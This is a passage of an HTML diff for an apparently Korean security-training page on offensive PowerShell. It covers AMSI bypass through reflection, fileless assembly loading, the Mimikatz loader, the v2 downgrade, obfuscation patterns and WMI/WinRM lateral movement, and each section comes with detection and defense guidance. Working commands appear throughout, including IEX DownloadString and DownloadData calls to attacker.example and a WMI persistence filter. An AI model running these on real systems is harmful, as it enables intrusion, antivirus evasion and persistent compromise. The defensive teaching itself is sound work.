+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">PowerShell 내부의 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">System.Management.Automation.AmsiUtils</code> 클래스에는 AMSI 초기화 실패 플래그가 있습니다. 이 private static 필드를 리플렉션으로 true로 설정하면 스캔이 스킵됩니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># .NET Reflection 기반 AMSI 우회 원리</div>
+                <div class="text-slate-500"># amsiInitFailed = true → 모든 스캔 건너뛰기</div>
+                <div class="text-white"></div>
+                <div class="text-white"><span class="text-yellow-400">$type</span> = [Ref].Assembly.GetType(</div>
+                <div class="text-white">    <span class="text-green-400">'System.Management.Automation.AmsiUtils'</span>)</div>
+                <div class="text-white"><span class="text-yellow-400">$field</span> = <span class="text-yellow-400">$type</span>.GetField(</div>
+                <div class="text-white">    <span class="text-green-400">'amsiInitFailed'</span>,</div>
+                <div class="text-white">    <span class="text-green-400">'NonPublic,Static'</span>)</div>
+                <div class="text-white"><span class="text-yellow-400">$field</span>.SetValue(<span class="text-yellow-400">$null</span>, <span class="text-yellow-400">$true</span>)</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 효과: PowerShell이 AMSI 초기화가 실패한 것으로 인식</div>
+                <div class="text-slate-500"># → AmsiUtils.ScanContent()가 호출되지 않음</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-teal-400">
+            <h3 class="font-bold text-xl mb-4 hl-teal">방법 3: CLR 후킹 — 함수 포인터 교체</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">.NET CLR 레벨에서 AmsiScanBuffer의 JIT 컴파일된 네이티브 코드 포인터를 자체 더미 함수로 교체하는 방식입니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500">// C# 의사코드: CLR 후킹 기반 AMSI 우회 원리</div>
+                <div class="text-white"><span class="text-purple-400">delegate int</span> AmsiScanBufferDelegate(</div>
+                <div class="text-white ml-4">IntPtr ctx, IntPtr buf, uint len,</div>
+                <div class="text-white ml-4">IntPtr name, IntPtr session, out int result);</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500">// 대체 함수: 항상 AMSI_RESULT_CLEAN(0) 반환</div>
+                <div class="text-white"><span class="text-purple-400">static int</span> <span class="text-yellow-400">FakeAmsiScan</span>(..., <span class="text-purple-400">out int</span> result) {</div>
+                <div class="text-white ml-4">result = <span class="text-orange-400">0</span>;  <span class="text-slate-500">// AMSI_RESULT_CLEAN</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">return</span> <span class="text-orange-400">0</span>;     <span class="text-slate-500">// S_OK</span></div>
+                <div class="text-white">}</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl">
+            <h3 class="font-bold text-lg mb-4 hl-red">방어자 관점: AMSI 우회 탐지 전략</h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-300 dark:border-blue-700">
+                    <div class="font-bold text-sm text-blue-700 dark:text-blue-400 mb-2">탐지 가능한 지표</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• ETW Provider로 AmsiScanBuffer 호출 빈도 모니터링</li>
+                        <li>• amsi.dll .text 섹션의 무결성 해시 주기적 검증</li>
+                        <li>• Script Block Logging (EID 4104)에서 난독화 패턴 탐지</li>
+                        <li>• VirtualProtect 호출 후 amsi.dll 주소 범위 쓰기 감시</li>
+                    </ul>
+                </div>
+                <div class="bg-red-50 dark:bg-red-900/20 p-4 rounded-lg border border-red-300 dark:border-red-700">
+                    <div class="font-bold text-sm text-red-700 dark:text-red-400 mb-2">탐지가 어려운 케이스</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• 커널 모드에서의 AMSI 우회</li>
+                        <li>• 프로세스 시작 직후 초기 패치 (Race Condition)</li>
+                        <li>• 알려지지 않은 오프셋 변형 패치</li>
+                        <li>• Hardware Breakpoint 기반 우회</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 3 ═══════════════════ -->
+<section id="ch3" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#3.</span> .NET Assembly 리플렉션 로딩 — 파일 없는 실행</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">🧬</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: 책을 서점에 두지 않고 머릿속에만 담기</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed"><strong>.NET 리플렉션 로딩</strong>은 악성 .NET 바이너리를 디스크에 저장하지 않고 <strong>메모리에 직접 로드하여 실행</strong>하는 기법입니다. AV가 디스크를 아무리 스캔해봐야 아무것도 없습니다 — 모든 것이 프로세스 메모리 안에만 존재합니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">Assembly::Load() 완전 분석</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">PowerShell에서 .NET Assembly를 메모리에 로드하는 핵심 메서드입니다. 바이트 배열을 인자로 받아 파일 I/O 없이 실행합니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># .NET Assembly 메모리 로딩 — 공격 체인 분석</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># Step 1: 원격 서버에서 Assembly 바이트 다운로드</div>
+                <div class="text-white"><span class="text-yellow-400">$wc</span> = New-Object System.Net.WebClient</div>
+                <div class="text-white"><span class="text-yellow-400">$bytes</span> = <span class="text-yellow-400">$wc</span>.DownloadData(<span class="text-green-400">"https://attacker.example/payload.exe"</span>)</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># Step 2: 메모리에 Assembly 로드 (디스크 터치 없음!)</div>
+                <div class="text-white"><span class="text-yellow-400">$asm</span> = [System.Reflection.Assembly]::Load(<span class="text-yellow-400">$bytes</span>)</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># Step 3: Entry Point 찾아서 실행</div>
+                <div class="text-white"><span class="text-yellow-400">$ep</span> = <span class="text-yellow-400">$asm</span>.EntryPoint</div>
+                <div class="text-white"><span class="text-yellow-400">$ep</span>.Invoke(<span class="text-yellow-400">$null</span>, @(,([string[]]@())))</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 결과: payload.exe가 디스크 기록 없이 메모리에서만 실행</div>
+                <div class="text-slate-500"># AV 파일 스캔 완전 우회, 포렌식 시 디스크에서 흔적 없음</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">실전 도구 분석: Invoke-Mimikatz 내부 동작</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">유명한 Invoke-Mimikatz.ps1은 이 기법의 대표 사례입니다. Mimikatz PE 바이너리가 Base64로 스크립트 내에 인코딩되어 있고, Reflective PE Injection으로 메모리 로딩됩니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># Invoke-Mimikatz 내부 동작 흐름 (교육용 간소화)</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 1. Base64 인코딩된 PE 바이너리</div>
+                <div class="text-white"><span class="text-yellow-400">$PEBytes64</span> = <span class="text-green-400">"TVqQAAMAAAAEAAAA//8AALgA..."</span>  <span class="text-slate-500"># ~1.2MB</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 2. 디코딩 → 바이트 배열</div>
+                <div class="text-white"><span class="text-yellow-400">$PEBytes</span> = [Convert]::FromBase64String(<span class="text-yellow-400">$PEBytes64</span>)</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 3. Reflective PE Injection</div>
+                <div class="text-slate-500"># → VirtualAlloc → 섹션 복사 → IAT 패치 → 재배치 → EP 호출</div>
+                <div class="text-white"><span class="text-yellow-400">Invoke-ReflectivePEInjection</span> -PEBytes <span class="text-yellow-400">$PEBytes</span></div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-amber-400">
+            <h3 class="font-bold text-xl mb-4 text-amber-700 dark:text-amber-400">탐지와 방어 전략</h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-slate-50 dark:bg-slate-800/50 p-4 rounded-lg border border-slate-200 dark:border-slate-700">
+                    <div class="font-bold text-xs text-slate-700 dark:text-slate-300 mb-2">포렌식 아티팩트</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• .NET CLR ETW 이벤트 (Assembly Load)</li>
+                        <li>• Script Block Logging (EID 4104)</li>
+                        <li>• 프로세스 메모리 덤프 내 PE 시그니처 (MZ 헤더)</li>
+                        <li>• Module Load 이벤트 (Sysmon EID 7)</li>
+                    </ul>
+                </div>
+                <div class="bg-slate-50 dark:bg-slate-800/50 p-4 rounded-lg border border-slate-200 dark:border-slate-700">
+                    <div class="font-bold text-xs text-slate-700 dark:text-slate-300 mb-2">방어 전략</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• Constrained Language Mode 적용</li>
+                        <li>• Assembly.Load 호출 ETW 모니터링</li>
+                        <li>• AppDomain 기반 코드 실행 제한</li>
+                        <li>• 대용량 Base64 문자열 탐지 규칙</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 4 ═══════════════════ -->
+<section id="ch4" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#4.</span> PowerShell 다운그레이드 공격 — v2.0의 유산</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">⏪</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: 최신 잠금장치를 무시하고 구형 자물쇠 사용</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed">PowerShell 2.0에는 AMSI, Script Block Logging, Constrained Language Mode가 <strong>모두 존재하지 않습니다</strong>. 공격자가 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">powershell.exe -Version 2</code>로 구버전을 강제 실행하면, 최신 보안 기능이 전부 무력화됩니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">다운그레이드 공격 실행과 검증</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># 다운그레이드 공격 실행</div>
+                <div class="text-white"><span class="text-yellow-400">C:\&gt;</span> powershell.exe <span class="text-red-400">-Version 2</span> -NoProfile -NonInteractive</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 버전 확인</div>
+                <div class="text-white">PS&gt; <span class="text-yellow-400">$PSVersionTable</span>.PSVersion</div>
+                <div class="text-white">Major  Minor  Build  Revision</div>
+                <div class="text-white">-----  -----  -----  --------</div>
+                <div class="text-red-400 font-bold">2      0      -1     -1</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># AMSI 테스트 — v2.0에서는 탐지되지 않음!</div>
+                <div class="text-white">PS&gt; <span class="text-green-400">"Invoke-Mimikatz"</span>  <span class="text-slate-500"># v5.0+에서는 AMSI가 차단</span></div>
+                <div class="text-green-400">Invoke-Mimikatz</div>  <span class="text-slate-500"># 아무 경고 없이 출력</span>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">전제 조건과 방어</h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-red-50 dark:bg-red-900/20 p-4 rounded-lg border border-red-300 dark:border-red-700">
+                    <div class="font-bold text-sm text-red-700 dark:text-red-400 mb-2">필요 조건</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• <strong>.NET Framework 2.0</strong> 설치 필수</li>
+                        <li>• Windows 10 1803 이전에는 기본 설치됨</li>
+                        <li>• Server 2016/2019에서도 옵션 설치 가능</li>
+                    </ul>
+                </div>
+                <div class="bg-green-50 dark:bg-green-900/20 p-4 rounded-lg border border-green-300 dark:border-green-700">
+                    <div class="font-bold text-sm text-green-700 dark:text-green-400 mb-2">방어 전략</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• <strong>.NET Framework 2.0/3.5 완전 제거</strong></li>
+                        <li>• AppLocker로 PowerShell v2 실행 차단</li>
+                        <li>• Event ID 400 EngineVersion=2.0 모니터링</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-amber-400">
+            <h3 class="font-bold text-xl mb-4 text-amber-700 dark:text-amber-400">탐지 규칙: Windows Event Log</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># Windows PowerShell 로그 → Event ID 400</div>
+                <div class="text-white">Log:     <span class="text-yellow-400">Windows PowerShell</span></div>
+                <div class="text-white">EventID: <span class="text-red-400 font-bold">400</span></div>
+                <div class="text-white">Message: Engine state is changed from None to Available.</div>
+                <div class="text-white">         <span class="text-red-400 font-bold">EngineVersion=2.0.50727.9168</span>  <span class="text-slate-500">← 2.0이면 경고!</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># .NET Framework 2.0 설치 여부 확인</div>
+                <div class="text-white">PS&gt; Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2</div>
+                <div class="text-white">State : <span class="text-red-400">Enabled</span>  <span class="text-slate-500">← Disabled로 변경 권장</span></div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-teal-400">
+            <h3 class="font-bold text-xl mb-4 hl-teal">PowerShell 난독화 기법 심층 분석</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed">다운그레이드 공격과 함께, 공격자는 <strong>난독화(Obfuscation)</strong> 기법을 결합하여 탐지를 회피합니다. 다음은 실무에서 자주 관찰되는 대표적 난독화 패턴입니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># ── 난독화 유형 1: 문자열 연결(Concatenation) ──</div>
+                <div class="text-white"><span class="text-yellow-400">$cmd</span> = <span class="text-green-400">"Inv"</span>+<span class="text-green-400">"oke-"</span>+<span class="text-green-400">"Mim"</span>+<span class="text-green-400">"ika"</span>+<span class="text-green-400">"tz"</span></div>
+                <div class="text-white">IEX <span class="text-yellow-400">$cmd</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># ── 난독화 유형 2: Tick(`) 삽입 ──</div>
+                <div class="text-white">I`n`v`o`k`e-M`i`m`i`k`a`t`z</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># ── 난독화 유형 3: -replace를 이용한 치환 ──</div>
+                <div class="text-white"><span class="text-yellow-400">$x</span> = <span class="text-green-400">"AAAA-BBBB"</span> -replace <span class="text-green-400">"AAAA"</span>,<span class="text-green-400">"Invoke"</span> `</div>
+                <div class="text-white">    -replace <span class="text-green-400">"BBBB"</span>,<span class="text-green-400">"Mimikatz"</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># ── 난독화 유형 4: 환경 변수 + 인덱싱 ──</div>
+                <div class="text-white"><span class="text-slate-500"># $env:ComSpec = "C:\Windows\system32\cmd.exe"</span></div>
+                <div class="text-white"><span class="text-yellow-400">$env:ComSpec</span>[4,15,25] -join <span class="text-green-400">''</span> <span class="text-slate-500"># → "iex"</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># ── 난독화 유형 5: SecureString 역변환 ──</div>
+                <div class="text-white"><span class="text-yellow-400">$ss</span> = ConvertTo-SecureString <span class="text-green-400">"IEX(payload)"</span> `</div>
+                <div class="text-white">    -AsPlainText -Force</div>
+                <div class="text-white"><span class="text-yellow-400">$ptr</span> = [Runtime.InteropServices.Marshal]::SecureStringToGlobalAllocUnicode(<span class="text-yellow-400">$ss</span>)</div>
+                <div class="text-white"><span class="text-yellow-400">$plain</span> = [Runtime.InteropServices.Marshal]::PtrToStringUni(<span class="text-yellow-400">$ptr</span>)</div>
+                <div class="text-white">IEX <span class="text-yellow-400">$plain</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># ── 난독화 유형 6: -f 포맷 연산자 ──</div>
+                <div class="text-white"><span class="text-yellow-400">$x</span> = <span class="text-green-400">"{2}{0}{1}"</span> -f <span class="text-green-400">"ke-Mimi"</span>,<span class="text-green-400">"katz"</span>,<span class="text-green-400">"Invo"</span></div>
+                <div class="text-white">IEX <span class="text-yellow-400">$x</span></div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl">
+            <h3 class="font-bold text-lg mb-4 hl-red">난독화 탐지 전략 매트릭스</h3>
+            <div class="overflow-x-auto">
+                <table class="w-full text-sm border border-slate-300 dark:border-slate-700 rounded-lg overflow-hidden">
+                    <thead>
+                        <tr class="bg-red-100 dark:bg-red-900/30">
+                            <th class="text-left py-2 px-3 text-red-800 dark:text-red-300 font-bold text-xs">난독화 유형</th>
+                            <th class="text-left py-2 px-3 text-red-800 dark:text-red-300 font-bold text-xs">탐지 방법</th>
+                            <th class="text-left py-2 px-3 text-red-800 dark:text-red-300 font-bold text-xs">탐지 도구</th>
+                        </tr>
+                    </thead>
+                    <tbody class="text-cgray dark:text-slate-300 text-xs">
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">문자열 연결</td>
+                            <td class="py-2 px-3">EID 4104 디코딩 후 원본 복원</td>
+                            <td class="py-2 px-3">Revoke-Obfuscation</td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">Tick 삽입</td>
+                            <td class="py-2 px-3">정규식 패턴 매칭 (backtick 제거)</td>
+                            <td class="py-2 px-3">Sigma + 정규식</td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">Base64 인코딩</td>
+                            <td class="py-2 px-3">-enc 플래그 + UTF-16LE 디코딩</td>
+                            <td class="py-2 px-3">YARA + CyberChef</td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">환경변수 인덱싱</td>
+                            <td class="py-2 px-3">Script Block Log에서 최종 실행 코드 확인</td>
+                            <td class="py-2 px-3">EID 4104 (디코딩됨)</td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">-f 포맷 연산자</td>
+                            <td class="py-2 px-3">AST 분석으로 포맷 문자열 재조합</td>
+                            <td class="py-2 px-3">PowerShell AST Parser</td>
+                        </tr>
+                        <tr>
+                            <td class="py-2 px-3 font-bold">SecureString 역변환</td>
+                            <td class="py-2 px-3">Marshal 클래스 호출 패턴 탐지</td>
+                            <td class="py-2 px-3">Sigma + YARA</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            <div class="mt-4 bg-blue-50 dark:bg-blue-900/20 p-3 rounded-lg border border-blue-300 dark:border-blue-700">
+                <div class="text-xs text-blue-700 dark:text-blue-400"><strong>핵심 포인트:</strong> Script Block Logging(EID 4104)은 PowerShell이 <strong>실행 직전에 디코딩한 최종 코드</strong>를 기록합니다. 즉, 아무리 복잡한 난독화를 적용하더라도 EID 4104에는 원본 코드가 남습니다. 이것이 Script Block Logging이 가장 중요한 방어 기제인 이유입니다.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 5 ═══════════════════ -->
+<section id="ch5" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#5.</span> WMI/CIM 연계 원격 실행 — 횡적 이동의 핵심</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">🌐</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: 내부 전화망으로 원격 명령 내리기</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed"><strong>WMI(Windows Management Instrumentation)</strong>는 Windows의 관리 인프라입니다. 공격자는 이를 악용하여 다른 시스템에서 PowerShell을 원격 실행하며 <strong>횡적 이동</strong>을 수행합니다. RDP나 PsExec보다 탐지가 훨씬 어렵습니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">원격 실행 기법 3가지</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># 방법 1: Invoke-WmiMethod + Win32_Process::Create</div>
+                <div class="text-white"><span class="text-yellow-400">Invoke-WmiMethod</span> -Class Win32_Process -Name Create `</div>
+                <div class="text-white">    -ArgumentList <span class="text-green-400">"powershell.exe -enc JABjAD0..."</span> `</div>
+                <div class="text-white">    -ComputerName <span class="text-green-400">"TARGET-PC"</span> -Credential <span class="text-yellow-400">$cred</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 방법 2: CIM (최신 대체) — WinRM 기반</div>
+                <div class="text-white"><span class="text-yellow-400">$s</span> = New-CimSession -ComputerName <span class="text-green-400">"TARGET-PC"</span> -Credential <span class="text-yellow-400">$cred</span></div>
+                <div class="text-white"><span class="text-yellow-400">Invoke-CimMethod</span> -CimSession <span class="text-yellow-400">$s</span> -ClassName Win32_Process `</div>
+                <div class="text-white">    -MethodName Create -Arguments @{</div>
+                <div class="text-white">        CommandLine=<span class="text-green-400">"powershell.exe -NoP -W Hidden -enc ..."</span>}</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 방법 3: WMI 이벤트 구독 (영구 백도어)</div>
+                <div class="text-white"><span class="text-yellow-400">$filter</span> = Set-WmiInstance -Namespace root\subscription `</div>
+                <div class="text-white">    -Class __EventFilter -Arguments @{</div>
+                <div class="text-white">        Name = <span class="text-green-400">"PersistFilter"</span></div>
+                <div class="text-white">        QueryLanguage = <span class="text-green-400">"WQL"</span></div>
+                <div class="text-white">        Query = <span class="text-green-400">"SELECT * FROM __InstanceModificationEvent</span></div>
+                <div class="text-white"><span class="text-green-400">            WITHIN 60 WHERE TargetInstance ISA</span></div>
+                <div class="text-white"><span class="text-green-400">            'Win32_PerfFormattedData_PerfOS_System'"</span>}</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-amber-400">
+            <h3 class="font-bold text-xl mb-4 text-amber-700 dark:text-amber-400">탐지 포인트 요약</h3>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div class="bg-slate-50 dark:bg-slate-800/50 p-4 rounded-lg border border-slate-200 dark:border-slate-700">
+                    <div class="font-bold text-xs text-slate-700 dark:text-slate-300 mb-2">네트워크 레벨</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• DCOM: TCP 135 + 동적 포트</li>
+                        <li>• WinRM: TCP 5985/5986</li>
+                        <li>• 비정상 SMB 트래픽</li>
+                    </ul>
+                </div>
+                <div class="bg-slate-50 dark:bg-slate-800/50 p-4 rounded-lg border border-slate-200 dark:border-slate-700">
+                    <div class="font-bold text-xs text-slate-700 dark:text-slate-300 mb-2">호스트 로그</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• Sysmon EID 1 (프로세스 생성)</li>
+                        <li>• WMI-Activity EID 5861</li>
+                        <li>• PowerShell Operational Log</li>
+                    </ul>
+                </div>
+                <div class="bg-slate-50 dark:bg-slate-800/50 p-4 rounded-lg border border-slate-200 dark:border-slate-700">
+                    <div class="font-bold text-xs text-slate-700 dark:text-slate-300 mb-2">WMI 영구 구독</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• __EventFilter 열거</li>
+                        <li>• FilterToConsumerBinding</li>
+                        <li>• 정기 점검 스크립트 필수</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">PowerShell Remoting (WinRM) 기반 원격 실행</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">WMI 외에도 PowerShell Remoting(WinRM)은 공격자가 자주 사용하는 원격 실행 채널입니다. Enter-PSSession과 Invoke-Command로 원격 시스템에서 임의의 PowerShell 코드를 실행할 수 있습니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># PowerShell Remoting 기반 원격 코드 실행</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 방법 1: 인터랙티브 원격 세션</div>
+                <div class="text-white"><span class="text-yellow-400">$cred</span> = Get-Credential</div>
+                <div class="text-white">Enter-PSSession -ComputerName <span class="text-green-400">"TARGET-DC01"</span> `</div>
+                <div class="text-white">    -Credential <span class="text-yellow-400">$cred</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 방법 2: 다수 호스트에 동시 명령 실행</div>
+                <div class="text-white"><span class="text-yellow-400">$targets</span> = @(<span class="text-green-400">"WEB01"</span>, <span class="text-green-400">"DB01"</span>, <span class="text-green-400">"APP01"</span>)</div>
+                <div class="text-white"><span class="text-yellow-400">Invoke-Command</span> -ComputerName <span class="text-yellow-400">$targets</span> `</div>
+                <div class="text-white">    -Credential <span class="text-yellow-400">$cred</span> `</div>
+                <div class="text-white">    -ScriptBlock {</div>
+                <div class="text-white ml-4"><span class="text-slate-500"># 이 블록은 원격 시스템에서 실행됨</span></div>
+                <div class="text-white ml-4">Get-Process | Where-Object {<span class="text-yellow-400">$_</span>.ProcessName -eq <span class="text-green-400">"lsass"</span>}</div>
+                <div class="text-white">    }</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 방법 3: 파일 없는 공격 — 메모리에서만 실행</div>
+                <div class="text-white"><span class="text-yellow-400">Invoke-Command</span> -ComputerName <span class="text-green-400">"TARGET-DC01"</span> `</div>
+                <div class="text-white">    -ScriptBlock {</div>
+                <div class="text-white ml-4">IEX (New-Object Net.WebClient).DownloadString(</div>
+                <div class="text-white ml-8"><span class="text-green-400">"https://attacker.example/payload.ps1"</span>)</div>
+                <div class="text-white">    } -Credential <span class="text-yellow-400">$cred</span></div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl">
+            <h3 class="font-bold text-lg mb-4 hl-red">WMI vs WinRM 비교</h3>
+            <div class="overflow-x-auto">
+                <table class="w-full text-sm border border-slate-300 dark:border-slate-700 rounded-lg overflow-hidden">
+                    <thead>
+                        <tr class="bg-red-100 dark:bg-red-900/30">
+                            <th class="text-left py-2 px-3 text-red-800 dark:text-red-300 font-bold text-xs">특성</th>
+                            <th class="text-left py-2 px-3 text-red-800 dark:text-red-300 font-bold text-xs">WMI (DCOM)</th>
+                            <th class="text-left py-2 px-3 text-red-800 dark:text-red-300 font-bold text-xs">WinRM (PSRemoting)</th>
+                        </tr>
+                    </thead>
+                    <tbody class="text-cgray dark:text-slate-300 text-xs">
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">프로토콜</td>
+                            <td class="py-2 px-3">DCOM (TCP 135 + 동적)</td>
+                            <td class="py-2 px-3">HTTP/HTTPS (TCP 5985/5986)</td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">출력 반환</td>
+                            <td class="py-2 px-3">제한적 (프로세스 생성만)</td>
+                            <td class="py-2 px-3">완전한 객체 반환</td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">지속성</td>
+                            <td class="py-2 px-3">이벤트 구독으로 영구 백도어 가능</td>
+                            <td class="py-2 px-3">세션 기반 (연결 유지 필요)</td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">탐지 난이도</td>
+                            <td class="py-2 px-3">높음 (정상 관리 트래픽과 유사)</td>
+                            <td class="py-2 px-3">중간 (로깅 잘 됨)</td>
+                        </tr>
+                        <tr>
+                            <td class="py-2 px-3 font-bold">암호화</td>
